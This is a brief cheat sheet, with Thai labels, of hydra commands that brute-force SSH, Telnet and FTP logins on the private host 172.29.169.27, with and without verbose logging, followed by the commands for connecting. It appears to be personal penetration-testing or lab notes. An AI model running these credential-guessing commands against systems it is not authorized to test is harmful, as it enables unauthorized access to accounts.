## SSH brute force

- สำหรับทดสอบ
```bash
hydra -L users.txt -P passwords.txt ssh://172.29.169.27 -t 4 -vV
```
- แบบไม่มี log
```bash
hydra -L users.txt -P passwords.txt ssh://172.29.169.27 -t 4
```

- สำหรับเชื่อมต่อ
```bash
ssh username@172.29.169.27
```

## Telnet brute force
- สำหรับทดสอบ
- แบบมี log
```bash
hydra -L users.txt -P passwords.txt telnet://172.29.169.27 -t 4 -vV
```
- แบบไม่มี log
```bash
hydra -L users.txt -P passwords.txt telnet://172.29.169.27 -t 4
```

- สำหรับเชื่อมต่อ
```bash
telnet 172.29.169.27 23
```

## FTP brute force
- แบบมี log
```bash
hydra -L users.txt -P passwords.txt ftp://172.29.169.27 -t 4 -vV
```
- แบบไม่มี log
```bash
hydra -L users.txt -P passwords.txt ftp://172.29.169.27 -t 4
```

- สำหรับเชื่อมต่อ
```bash
ftp 172.29.169.27
```